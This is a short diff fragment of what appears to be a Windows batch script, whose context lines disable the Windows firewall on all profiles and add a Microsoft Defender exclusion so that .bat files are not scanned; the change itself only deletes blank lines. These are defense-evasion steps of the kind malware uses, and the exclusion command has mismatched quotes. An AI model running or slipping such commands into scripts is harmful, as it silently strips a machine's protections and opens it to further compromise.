@@ -24,7 +24,3 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 REM-  We ensure that .bat files are not scanned
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat'"
-
-
- 
-  
